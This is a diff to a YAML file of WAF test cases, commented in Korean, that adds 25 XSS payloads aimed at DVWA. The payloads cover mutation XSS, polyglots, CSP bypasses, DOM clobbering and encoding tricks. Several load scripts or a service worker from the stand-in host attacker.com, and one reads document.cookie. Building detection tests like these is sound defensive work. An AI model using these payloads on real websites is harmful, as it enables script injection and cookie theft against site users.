@@ -2,12 +2,12 @@
 # Cross-Site Scripting (XSS) Test Cases
 # =============================================================================
 # DVWA의 XSS 취약점을 통해 WAF의 XSS 탐지 능력을 검증합니다.
-# Stored XSS, Reflected XSS, DOM-based XSS 등 다양한 유형을 테스트합니다.
+# Reflected, Stored, DOM, mXSS, Polyglot, CSP 우회 등 45케이스
 # =============================================================================
 
 category: "xss"
 name: "Cross-Site Scripting"
-description: "XSS (Cross-Site Scripting) 공격 탐지 테스트"
+description: "XSS (Cross-Site Scripting) 공격 탐지 테스트 (확장판 45케이스)"
 severity: "critical"
 icon: "💉"
 
@@ -178,3 +178,215 @@ tests:
     params:
       name: '<div style="background:url(javascript:alert(1))">'
     severity: "medium"
+
+  # ======== [신규 확장: +25 케이스] ========
+
+  # --- mXSS (Mutation XSS) ---
+  - id: "xss-021"
+    description: "mXSS - <svg><style>/*@import*/</style></svg>"
+    method: "GET"
+    path: "/vulnerabilities/xss_r/"
+    params:
+      name: '<svg><style>/*@import*/<script>alert(1)</script></style></svg>'
+    severity: "high"
+
+  - id: "xss-022"
+    description: "mXSS - <noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">"
+    method: "GET"
+    path: "/vulnerabilities/xss_r/"
+    params:
+      name: '<noscript><p title="</noscript><img src=x onerror=alert(1)>">'
+    severity: "high"
+
+  - id: "xss-023"
+    description: "mXSS - <math><style><!--</style><img>"
+    method: "GET"
+    path: "/vulnerabilities/xss_r/"
+    params:
+      name: '<math><style><!--</style><img src=x onerror=alert(1)>'
+    severity: "high"
+
+  # --- Polyglot XSS ---
+  - id: "xss-024"
+    description: "Polyglot XSS - 다중 문법 동시 만족"
+    method: "GET"
+    path: "/vulnerabilities/xss_r/"
+    params:
+      name: '">><img src=x onerror=alert(1)><svg onload=alert(1)><script>alert(1)</script>'
+    severity: "critical"
+
+  - id: "xss-025"
+    description: "Polyglot XSS - ';alert(1)//<img src=x>"
+    method: "GET"
+    path: "/vulnerabilities/xss_r/"
+    params:
+      name: "';alert(1)//<img src=x onerror=alert(1)>"
+    severity: "critical"
+
+  # --- CSP 우회 ---
+  - id: "xss-026"
+    description: "CSP Bypass - <base> 태그 조작"
+    method: "GET"
+    path: "/vulnerabilities/xss_r/"
+    params:
+      name: '<base href="http://attacker.com/"><script src=main.js></script>'
+    severity: "high"
+
+  - id: "xss-027"
+    description: "CSP Bypass - <link rel=stylesheet>"
+    method: "GET"
+    path: "/vulnerabilities/xss_r/"
+    params:
+      name: '<link rel="stylesheet" href="http://attacker.com/evil.css">'
+    severity: "high"
+
+  - id: "xss-028"
+    description: "CSP Bypass - <meta http-equiv=refresh>"
+    method: "GET"
+    path: "/vulnerabilities/xss_r/"
+    params:
+      name: '<meta http-equiv="refresh" content="0;url=http://attacker.com">'
+    severity: "high"
+
+  # --- 고급 이벤트 핸들러 ---
+  - id: "xss-029"
+    description: "XSS - <video oncanplay>"
+    method: "GET"
+    path: "/vulnerabilities/xss_r/"
+    params:
+      name: '<video><source onerror=alert(1)>'
+    severity: "high"
+
+  - id: "xss-030"
+    description: "XSS - <audio onloadeddata>"
+    method: "GET"
+    path: "/vulnerabilities/xss_r/"
+    params:
+      name: '<audio src=x onloadeddata=alert(1)>'
+    severity: "high"
+
+  - id: "xss-031"
+    description: "XSS - <object usemap>"
+    method: "GET"
+    path: "/vulnerabilities/xss_r/"
+    params:
+      name: '<object usemap="#x"><map name="x"><area shape=default href="javascript:alert(1)"></map></object>'
+    severity: "high"
+
+  - id: "xss-032"
+    description: "XSS - <select onfocus> 자동 포커스"
+    method: "GET"
+    path: "/vulnerabilities/xss_r/"
+    params:
+      name: '<select autofocus onfocus=alert(1)><option>'
+    severity: "high"
+
+  # --- DOM Clobbering ---
+  - id: "xss-033"
+    description: "DOM Clobbering - <a id=config>"
+    method: "GET"
+    path: "/vulnerabilities/xss_r/"
+    params:
+      name: '<a id=config><a id=config name=api><a id=config name=api href="javascript:alert(1)">'
+    severity: "medium"
+
+  - id: "xss-034"
+    description: "DOM Clobbering - <form name=body>"
+    method: "GET"
+    path: "/vulnerabilities/xss_r/"
+    params:
+      name: '<form id=body><input name=innerHTML>'
+    severity: "medium"
+
+  # --- Service Worker / PWA ---
+  - id: "xss-035"
+    description: "XSS - importScripts ServiceWorker"
+    method: "GET"
+    path: "/vulnerabilities/xss_r/"
+    params:
+      name: "<script>navigator.serviceWorker.register('http://attacker.com/sw.js')</script>"
+    severity: "critical"
+
+  # --- Trusted Types Bypass ---
+  - id: "xss-036"
+    description: "XSS - Trusted Types 우회 시도"
+    method: "GET"
+    path: "/vulnerabilities/xss_r/"
+    params:
+      name: "<script>document.body.innerHTML = '<img src=x onerror=alert(1)>'</script>"
+    severity: "high"
+
+  # --- XSS via Referer / Header ---
+  - id: "xss-037"
+    description: "XSS - HTTP 헤더 주입 <script>"
+    method: "GET"
+    path: "/vulnerabilities/xss_r/"
+    params:
+      name: "<script>alert(document.cookie)</script>"
+    severity: "critical"
+
+  # --- XSS via URI Fragment ---
+  - id: "xss-038"
+    description: "XSS - URL 해시 fragment"
+    method: "GET"
+    path: "/vulnerabilities/xss_d/"
+    params:
+      default: "#<img src=x onerror=alert(1)>"
+    severity: "high"
+
+  - id: "xss-039"
+    description: "XSS - URL searchParams 조작"
+    method: "GET"
+    path: "/vulnerabilities/xss_r/"
+    params:
+      name: "?name=<script>alert(1)</script>"
+    severity: "critical"
+
+  # --- WAF 우회 추가 기법 ---
+  - id: "xss-040"
+    description: "XSS - Unicode 분할 우회 \\u003c"
+    method: "GET"
+    path: "/vulnerabilities/xss_r/"
+    params:
+      name: "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"
+    severity: "medium"
+
+  - id: "xss-041"
+    description: "XSS - JSFuck 인코딩"
+    method: "GET"
+    path: "/vulnerabilities/xss_r/"
+    params:
+      name: "<script>[]+[]</script>"
+    severity: "medium"
+
+  - id: "xss-042"
+    description: "XSS - 태그 내 공백 변형 %09"
+    method: "GET"
+    path: "/vulnerabilities/xss_r/"
+    params:
+      name: "<img%09src=x%09onerror=alert(1)>"
+    severity: "medium"
+
+  - id: "xss-043"
+    description: "XSS - 줄바꿈 %0aonerror"
+    method: "GET"
+    path: "/vulnerabilities/xss_r/"
+    params:
+      name: "<img src=x%0aonerror=alert(1)>"
+    severity: "medium"
+
+  - id: "xss-044"
+    description: "XSS - <svg><script href>"
+    method: "GET"
+    path: "/vulnerabilities/xss_r/"
+    params:
+      name: '<svg><script href="http://attacker.com/xss.js"/>'
+    severity: "high"
+
+  - id: "xss-045"
+    description: "XSS - <template shadowroot>"
+    method: "GET"
+    path: "/vulnerabilities/xss_r/"
+    params:
+      name: '<template shadowroot="open"><img src=x onerror=alert(1)></template>'
+    severity: "high"
